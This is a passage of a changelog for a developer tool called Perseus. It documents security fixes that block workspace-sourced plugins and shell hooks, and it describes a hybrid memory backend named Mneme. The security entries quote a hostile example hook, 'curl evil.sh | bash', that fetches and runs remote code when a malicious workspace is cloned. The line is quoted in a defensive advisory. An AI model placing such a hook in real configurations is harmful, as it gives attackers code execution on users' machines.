- **Mneme as default persistent store, Sibyl as optional upgrade** — Perseus now
  defaults to standalone Mneme (zero-dependency Rust binary with SQLite FTS5)
  for long-term memory. Sibyl Memory remains available as an opt-in upgrade via
  `sibyl_memory.enabled: true` or `SIBYL_MEMORY_ENABLED=1`. The `_sibyl_enabled()`

  README, DIRECTIVES, skills) updated to reflect Mneme as default. Config key
  is `mneme:` (was `engram:`).

26|### 🔒 Security
27|
28|- **#169** — Workspace-sourced plugin configuration (`plugins.dir`) is
29|  now refused by default. Pre-1.0.6 a workspace `.perseus/config.yaml`
30|  setting `plugins.dir: /path/to/attacker/code` caused
31|  `_discover_plugins()` to `spec.loader.exec_module(mod)` on every
32|  `.py` file in that directory at startup — full Python execution
33|  before any directive trust gate, audit, or user prompt. Same attack
34|  vector as #168 but with no shell-quoting limits. Attack: git clone a
35|  malicious workspace, get pwned.
36|
37|  Fix: `_discover_plugins` consults
38|  `cfg["_provenance"]["plugins_workspace_sourced"]` set by
39|  `load_config`. Workspace-sourced plugin config is refused unless BOTH:
40|  1. Global `~/.perseus/config.yaml` sets `plugins.allow_workspace_sourced: true`
41|  2. Env var `PERSEUS_ALLOW_DANGEROUS=1`
42|
43|  Refusal emits a `plugins_workspace_refused` audit event with the
44|  refused directory path. Global-sourced plugin config is unaffected.
45|
46|  Regression suite (8 tests): workspace plugin dir refused by default,
47|  allowed with full opt-in, refused with only-global, refused with
48|  only-env, global plugins always load, audit trail, no false-positive
49|  refusal when no plugin config exists, allow-gate helper unit test.
50|
51|- **#168** — Workspace-sourced shell hooks and Python `hooks.dir` are
52|  now refused by default. Pre-1.0.6 a workspace `.perseus/config.yaml`
53|  could declare `hooks.on_render_start: ["curl evil.sh | bash"]` and
54|  the command would run on the next `perseus render` — no
55|  `allow_query_shell`, no `PERSEUS_ALLOW_DANGEROUS`, no audit. Same
56|  attack via `hooks.dir: /path/to/attacker/code` (Python top-level
57|  code runs at import time). Attack: git clone a malicious workspace,
58|  get pwned.
59|
60|  Fix: `load_config` annotates `cfg["_provenance"]` with which
61|  sections came from the workspace source. `hooks.py` refuses
62|  workspace-sourced shell hooks and `hooks.dir` Python hooks unless
63|  BOTH conditions are met:
64|  1. Global `~/.perseus/config.yaml` sets `hooks.allow_workspace_sourced: true`
65|  2. Env var `PERSEUS_ALLOW_DANGEROUS=1` is set
66|
67|  Refusal emits `hooks_workspace_refused` / `hooks_workspace_shell_refused`
68|  audit events plus a stderr warning. Global-sourced hooks are
69|  unaffected (the user owns global config; trust is implicit).
70|
71|  Regression suite (10 tests): workspace shell hook refused, allowed
72|  with full opt-in, refused with only-global opt-in, refused with
73|  only-env opt-in, global hooks always run, provenance tracking, audit
74|  trail, Python hooks.dir refused.

76|### 🧠 Mneme Hybrid Memory — Project Synapse
77|
78|**Mnēmē v2 receives an optional persistent memory accelerator** via
79|Mneme, an MCP-based hybrid resolution bridge. Mnēmē alone is an
80|in-process local memory engine (SQLite FTS5, zero daemon, 37ms P50
81|search). Mneme adds a second tier: a remote persistent memory
82|backend with Ebbinghaus time-decay, topic trees, and hybrid search
83|(semantic + BM25) accessible over MCP JSON-RPC.
84|
85|The hybrid resolution flow (Project Synapse) merges both layers at
86|render time:
87|
88|1. **Sense layer (Live)** — Perseus resolves current environment state
89|   (ports, services, system health).
90|2. **Memory layer (Mneme)** — Queries the remote backend for
91|   relevant historical context (architecture decisions, past debugging
92|   sessions, project conventions).
93|3. **Merge** — Combines both into a single `ContextPackage`, with
94|   Mneme results ranked by `decay_score` (Ebbinghaus algorithm)
95|   so recently reinforced memories surface first.
96|
97|**Infrastructure:**
98|- `MnemeConnector` — MCP client communicating with Mneme via
99|  stdio JSON-RPC (SSE for remote deployments).
100|- Circuit breaker and exponential backoff (threshold: 3 failures,
101|  120s cooldown) — if Mneme is offline, Perseus automatically
102|  degrades to local-only Mnēmē FTS5 without hanging or crashing.
103|- Configuration under the `mneme:` block in config.yaml with
104|  `merge_strategy` (local_first, remote_first, interleave),
105|  `retry_policy`, and connection parameters.
106|
107|**Data model:** `MemoryHit`, `MemoryLayer` (core/working/buffer),
108|and `ContextPackage` dataclasses enforce source tagging so the
109|assistant can distinguish "what is happening now" from "what we
110|decided then."
111|
112|**FTS5 fallback (v1.0.6+, mneme v0.5.0+):** When `memory_recall` returns
113|empty vector results (e.g., the embedding index is cold or not yet built),
114|Perseus automatically falls back to local SQLite FTS5 keyword search over
115|the mneme database (`~/.perseus/mneme/mneme.db`). This guarantees memory
116|recall always returns results — no silent empty responses. The mneme binary
117|(`mneme`) writes to this database; Perseus reads it directly.
118|
119|**memory_add is async:** The `memory_add` MCP tool returns `null` or empty
120|while the LLM-based fact extraction pipeline runs in the background. Perseus
121|treats null responses as success — data is stored and will be available on
122|the next `memory_recall` call. No polling or retry logic is needed.
123|
124|All Mnemosyne-specific types and gRPC transport have been replaced.
125|The `@memory` directive and MCP tool `perseus_memory` resolve
126|through the unified hybrid path. 32 smoke tests validate the full
127|pipeline including circuit breaker open/close, backoff timing,
128|merge strategies, decay-score ordering, and graceful degradation.
129|
130|**Config migration:** Replace any legacy `mnemosyne:` block with
131|`mneme:`. See [SETUP-GUIDE.md § Mneme Hybrid Resolution](./SETUP-GUIDE.md)
132|for the full configuration reference.
